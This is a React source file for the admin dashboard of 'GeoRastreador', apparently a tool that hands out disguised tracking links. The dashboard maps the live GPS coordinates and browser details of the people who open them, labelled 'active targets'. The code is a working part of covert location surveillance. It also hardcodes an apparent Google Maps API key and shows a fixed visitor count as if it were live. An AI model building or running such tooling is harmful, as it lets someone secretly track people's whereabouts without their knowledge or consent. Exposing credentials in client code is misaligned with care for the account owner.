import React, { useEffect, useState, useRef } from 'react';
import { GoogleMap, useLoadScript, Marker } from '@react-google-maps/api';
import { io } from 'socket.io-client';
import api from '../services/api';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../contexts/AuthContext';

const mapContainerStyle = {
    width: '100%',
    height: '100%'
};

const center = {
    lat: -34.603722,
    lng: -58.381592
};

const mapOptions = {
    disableDefaultUI: true,
    styles: [
        { elementType: "geometry", stylers: [{ color: "#242f3e" }] },
        { elementType: "labels.text.stroke", stylers: [{ color: "#242f3e" }] },
        { elementType: "labels.text.fill", stylers: [{ color: "#746855" }] },
        {
            featureType: "administrative.locality",
            elementType: "labels.text.fill",
            stylers: [{ color: "#d59563" }],
        },
        {
            featureType: "poi",
            elementType: "labels.text.fill",
            stylers: [{ color: "#d59563" }],
        },
        {
            featureType: "poi.park",
            elementType: "geometry",
            stylers: [{ color: "#263c3f" }],
        },
        {
            featureType: "poi.park",
            elementType: "labels.text.fill",
            stylers: [{ color: "#6b9a76" }],
        },
        {
            featureType: "road",
            elementType: "geometry",
            stylers: [{ color: "#38414e" }],
        },
        {
            featureType: "road",
            elementType: "geometry.stroke",
            stylers: [{ color: "#212a37" }],
        },
        {
            featureType: "road",
            elementType: "labels.text.fill",
            stylers: [{ color: "#9ca5b3" }],
        },
        {
            featureType: "road.highway",
            elementType: "geometry",
            stylers: [{ color: "#746855" }],
        },
        {
            featureType: "road.highway",
            elementType: "geometry.stroke",
            stylers: [{ color: "#1f2835" }],
        },
        {
            featureType: "road.highway",
            elementType: "labels.text.fill",
            stylers: [{ color: "#f3d19c" }],
        },
        {
            featureType: "transit",
            elementType: "geometry",
            stylers: [{ color: "#2f3948" }],
        },
        {
            featureType: "transit.station",
            elementType: "labels.text.fill",
            stylers: [{ color: "#d59563" }],
        },
        {
            featureType: "water",
            elementType: "geometry",
            stylers: [{ color: "#17263c" }],
        },
        {
            featureType: "water",
            elementType: "labels.text.fill",
            stylers: [{ color: "#515c6d" }],
        },
        {
            featureType: "water",
            elementType: "labels.text.stroke",
            stylers: [{ color: "#17263c" }],
        },
    ]
};

const AdminDashboard = () => {
    const navigate = useNavigate();
    const { logout } = useAuth();
    const [stats, setStats] = useState({ totalLinks: 0, totalLocations: 0 });
    const [links, setLinks] = useState([]);
    const [sessions, setSessions] = useState([]);
    const [activeTab, setActiveTab] = useState('dashboard');
    const { isLoaded, loadError } = useLoadScript({
        googleMapsApiKey: 'AIzaSyA4qMbpLlGXpc3EOTqelCXEdmCQBYnJh9g',
    });

    const socketRef = useRef();

    useEffect(() => {
        fetchAdminData();
        const socket = io('http://localhost:3001');
        socketRef.current = socket;
        socket.on('connect', () => socket.emit('join-admin'));
        socket.on('location-updated', (session) => {
            setSessions(prev => [session, ...prev]);
        });
        return () => socket.disconnect();
    }, []);

    const fetchAdminData = async () => {
        try {
            const [linksRes, sessionsRes] = await Promise.all([
                api.get('/admin/links'),
                api.get('/user/sessions') // Using existing route or create admin specific
            ]);
            setLinks(linksRes.data);
            setSessions(sessionsRes.data);
        } catch (e) { console.error("Error fetching admin data", e); }
    };

    if (loadError) return <div>Error loading maps</div>;
    if (!isLoaded) return <div>Loading Maps...</div>;

    return (
        <div className="bg-background-light dark:bg-background-dark text-slate-900 dark:text-slate-100 antialiased overflow-hidden min-h-screen flex w-full">
            {/* Sidebar Navigation */}
            <aside className="w-64 flex flex-col border-r border-slate-200 dark:border-slate-800 bg-white dark:bg-background-dark z-20">
                <div className="p-6 flex flex-col h-full justify-between">
                    <div className="flex flex-col gap-8">
                        {/* Brand */}
                        <div className="flex items-center gap-3">
                            <div className="bg-primary rounded-lg p-2 text-white flex items-center justify-center">
                                <span className="material-symbols-outlined">radar</span>
                            </div>
                            <div className="flex flex-col">
                                <h1 className="text-slate-900 dark:text-white text-base font-bold leading-none">GeoRastreador</h1>
                                <p className="text-slate-500 dark:text-[#92adc9] text-xs font-normal">Analítica de Seguridad</p>
                            </div>
                        </div>
                        {/* Nav Links */}
                        <nav className="flex flex-col gap-1">
                            <button
                                onClick={() => setActiveTab('dashboard')}
                                className={`flex items-center gap-3 px-3 py-2.5 rounded-lg transition-all ${activeTab === 'dashboard' ? 'bg-primary/10 text-primary font-bold' : 'text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800'}`}
                            >
                                <span className="material-symbols-outlined text-[22px]">dashboard</span>
                                <span className="text-sm font-semibold">Panel</span>
                            </button>
                            <button
                                onClick={() => navigate('/create')}
                                className="flex items-center gap-3 px-3 py-2.5 rounded-lg text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors"
                            >
                                <span className="material-symbols-outlined text-[22px]">add_link</span>
                                <span className="text-sm font-medium">Crear Enlace</span>
                            </button>
                            <button
                                onClick={() => setActiveTab('links')}
                                className={`flex items-center gap-3 px-3 py-2.5 rounded-lg transition-all ${activeTab === 'links' ? 'bg-primary/10 text-primary font-bold' : 'text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800'}`}
                            >
                                <span className="material-symbols-outlined text-[22px]">link</span>
                                <span className="text-sm font-medium">Mis Enlaces</span>
                            </button>
                            <button
                                onClick={() => setActiveTab('campaigns')}
                                className={`flex items-center gap-3 px-3 py-2.5 rounded-lg transition-all ${activeTab === 'campaigns' ? 'bg-primary/10 text-primary font-bold' : 'text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800'}`}
                            >
                                <span className="material-symbols-outlined text-[22px]">analytics</span>
                                <span className="text-sm font-medium">Analíticas</span>
                            </button>

                            <hr className="my-2 border-white/5" />

                            <button
                                onClick={() => setActiveTab('settings')}
                                className={`flex items-center gap-3 px-3 py-2.5 rounded-lg transition-all ${activeTab === 'settings' ? 'bg-primary/10 text-primary font-bold' : 'text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800'}`}
                            >
                                <span className="material-symbols-outlined text-[22px]">settings</span>
                                <span className="text-sm font-medium">Configuración</span>
                            </button>

                            <hr className="my-2 border-slate-100 dark:border-slate-800" />

                            <button
                                onClick={() => {
                                    logout();
                                    navigate('/login');
                                }}
                                className="flex items-center gap-3 px-3 py-2.5 rounded-lg text-red-500 hover:bg-red-50 dark:hover:bg-red-900/10 transition-all font-medium"
                            >
                                <span className="material-symbols-outlined text-[22px]">logout</span>
                                <span className="text-sm">Cerrar Sesión</span>
                            </button>
                        </nav>
                    </div>
                    {/* Action Button */}
                    <button onClick={() => window.location.href = '/create'} className="flex w-full items-center justify-center gap-2 rounded-lg h-11 bg-primary text-white text-sm font-bold shadow-lg shadow-primary/20 hover:bg-primary/90 transition-all">
                        <span className="material-symbols-outlined text-[20px]">add_link</span>
                        <span>Generar Enlace</span>
                    </button>
                </div>
            </aside>

            {/* Main Content Area */}
            <main className="flex-1 flex flex-col relative overflow-hidden">
                {/* Content: Dashboard (Map + Stats) */}
                {activeTab === 'dashboard' && (
                    <>
                        {/* Map Background Layer - Now Real Map */}
                        <div className="absolute inset-0 z-0 bg-background-dark">
                            <GoogleMap
                                mapContainerStyle={mapContainerStyle}
                                zoom={2}
                                center={center}
                                options={mapOptions}
                            >
                                {sessions.map(s => (
                                    <Marker
                                        key={s.socketId}
                                        position={{ lat: s.lat, lng: s.lng }}
                                        title={s.userAgent}
                                    />
                                ))}
                            </GoogleMap>

                            <div className="absolute inset-0 map-gradient-overlay pointer-events-none"></div>

                            {/* Floating Map Controls */}
                            <div className="absolute right-6 top-1/2 -translate-y-1/2 flex flex-col gap-2 z-10">
                                <button className="flex size-10 items-center justify-center rounded-lg bg-white/10 backdrop-blur-md border border-white/10 text-white hover:bg-white/20">
                                    <span className="material-symbols-outlined">add</span>
                                </button>
                                <button className="flex size-10 items-center justify-center rounded-lg bg-white/10 backdrop-blur-md border border-white/10 text-white hover:bg-white/20">
                                    <span className="material-symbols-outlined">remove</span>
                                </button>
                            </div>
                        </div>

                        {/* Top Stats Overlay */}
                        <div className="relative z-10 p-6 pointer-events-none">
                            <div className="flex flex-wrap gap-4 pointer-events-auto">
                                <div className="flex min-w-[180px] flex-1 flex-col gap-1 rounded-xl p-5 bg-white/10 backdrop-blur-lg border border-white/10">
                                    <p className="text-slate-300 text-xs font-medium uppercase tracking-wider">Objetivos Activos</p>
                                    <div className="flex items-end gap-2">
                                        <p className="text-white text-3xl font-bold leading-none">{sessions.length}</p>
                                        <p className="text-[#0bda5b] text-sm font-bold pb-1">En Vivo</p>
                                    </div>
                                </div>
                                <div className="flex min-w-[180px] flex-1 flex-col gap-1 rounded-xl p-5 bg-white/10 backdrop-blur-lg border border-white/10">
                                    <p className="text-slate-300 text-xs font-medium uppercase tracking-wider">Impactos Totales</p>
                                    <div className="flex items-end gap-2">
                                        <p className="text-white text-3xl font-bold leading-none">1,284</p>
                                        <p className="text-[#0bda5b] text-sm font-bold pb-1">+12%</p>
                                    </div>
                                </div>
                            </div>
                        </div>

                        {/* Bottom Panel: Recent Activity */}
                        <div className="mt-auto relative z-10 bg-white/5 backdrop-blur-2xl border-t border-white/10 max-h-[40vh] overflow-hidden flex flex-col">
                            <div className="px-6 py-4 flex items-center justify-between border-b border-white/5">
                                <h2 className="text-white text-lg font-bold flex items-center gap-2">
                                    <span className="material-symbols-outlined text-primary">analytics</span>
                                    Registro de Actividad
                                </h2>
                                <div className="flex items-center gap-3">
                                    <span className="flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-green-500/20 text-green-400 text-[10px] font-bold uppercase">
                                        <span className="size-1.5 rounded-full bg-green-500 animate-pulse"></span>
                                        En Vivo
                                    </span>
                                </div>
                            </div>
                            <div className="flex-1 overflow-auto custom-scrollbar">
                                <table className="w-full text-left border-collapse">
                                    <thead className="sticky top-0 bg-[#1a2634] z-10">
                                        <tr>
                                            <th className="px-6 py-3 text-slate-400 text-xs font-semibold uppercase tracking-wider">Hora</th>
                                            <th className="px-6 py-3 text-slate-400 text-xs font-semibold uppercase tracking-wider text-center">Navegador</th>
                                            <th className="px-6 py-3 text-slate-400 text-xs font-semibold uppercase tracking-wider">Coordenadas</th>
                                            <th className="px-6 py-3 text-slate-400 text-xs font-semibold uppercase tracking-wider">ID Enlace</th>
                                        </tr>
                                    </thead>
                                    <tbody className="divide-y divide-white/5">
                                        {sessions.map(s => (
                                            <tr key={s.socketId} className="hover:bg-white/5 transition-colors group">
                                                <td className="px-6 py-4 text-primary text-sm font-medium">{new Date(s.timestamp).toLocaleTimeString()}</td>
                                                <td className="px-6 py-4 text-white text-sm font-mono truncate max-w-[200px]">{s.userAgent}</td>
                                                <td className="px-6 py-4 text-slate-400 text-sm font-mono italic">{s.lat.toFixed(4)}, {s.lng.toFixed(4)}</td>
                                                <td className="px-6 py-4">
                                                    <span className="px-3 py-1 rounded-lg bg-primary/20 text-primary text-xs font-bold border border-primary/20">{s.linkId}</span>
                                                </td>
                                            </tr>
                                        ))}
                                        {sessions.length === 0 && (
                                            <tr>
                                                <td colSpan="4" className="px-6 py-4 text-center text-slate-500">Esperando conexiones...</td>
                                            </tr>
                                        )}
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </>
                )}

                {activeTab === 'campaigns' && (
                    <div className="p-8">
                        <h2 className="text-2xl font-bold text-white mb-4">Campañas Activas</h2>
                        <div className="bg-white/5 rounded-xl border border-white/10 p-8 text-center text-slate-400">
                            Próximamente: Gestión avanzada de campañas.
                        </div>
                    </div>
                )}

                {activeTab === 'links' && (
                    <div className="p-8">
                        <div className="flex justify-between items-center mb-6">
                            <h2 className="text-2xl font-bold text-white">Gestión Global de Enlaces</h2>
                            <button onClick={() => navigate('/create')} className="btn-primary px-4 py-2 rounded-lg text-sm font-bold flex items-center gap-2">
                                <span className="material-symbols-outlined text-sm">add</span>
                                Nuevo Enlace
                            </button>
                        </div>
                        <div className="bg-white/5 rounded-xl border border-white/10 overflow-hidden shadow-2xl">
                            <table className="w-full text-left">
                                <thead className="bg-white/5 border-b border-white/5">
                                    <tr>
                                        <th className="px-6 py-4 text-xs font-semibold text-slate-400 uppercase">Enlace / Título</th>
                                        <th className="px-6 py-4 text-xs font-semibold text-slate-400 uppercase">Creador</th>
                                        <th className="px-6 py-4 text-xs font-semibold text-slate-400 uppercase">Destino</th>
                                        <th className="px-6 py-4 text-xs font-semibold text-slate-400 uppercase text-right">Acción</th>
                                    </tr>
                                </thead>
                                <tbody className="divide-y divide-white/5 font-display">
                                    {links.map(link => (
                                        <tr key={link.id} className="hover:bg-white/5 transition-colors group">
                                            <td className="px-6 py-4">
                                                <div className="flex items-center gap-3">
                                                    <div className="w-10 h-10 rounded-lg bg-slate-800 bg-cover bg-center border border-white/10" style={{ backgroundImage: `url(${link.imageUrl})` }}></div>
                                                    <div className="flex flex-col">
                                                        <span className="text-sm font-bold text-white">{link.title || 'Sin título'}</span>
                                                        <span className="text-[10px] text-slate-500 font-mono">ID: {link.id}</span>
                                                    </div>
                                                </div>
                                            </td>
                                            <td className="px-6 py-4">
                                                <span className="text-sm text-slate-300">{(link.User && link.User.email) || 'Desconocido'}</span>
                                            </td>
                                            <td className="px-6 py-4">
                                                <span className="text-sm text-primary hover:underline truncate max-w-[150px] block cursor-pointer">{link.destinationUrl}</span>
                                            </td>
                                            <td className="px-6 py-4 text-right">
                                                <button
                                                    onClick={() => navigator.clipboard.writeText(`${window.location.origin}/track/${link.id}`)}
                                                    className="px-3 py-1.5 rounded-lg bg-primary/10 text-primary text-xs font-black border border-primary/20 hover:bg-primary/20 transition-all"
                                                >
                                                    COPIAR
                                                </button>
                                            </td>
                                        </tr>
                                    ))}
                                    {links.length === 0 && (
                                        <tr>
                                            <td colSpan="4" className="px-8 py-12 text-center text-slate-500 italic">No se han encontrado enlaces generados.</td>
                                        </tr>
                                    )}
                                </tbody>
                            </table>
                        </div>
                    </div>
                )}
            </main>
        </div>
    );
};

export default AdminDashboard;
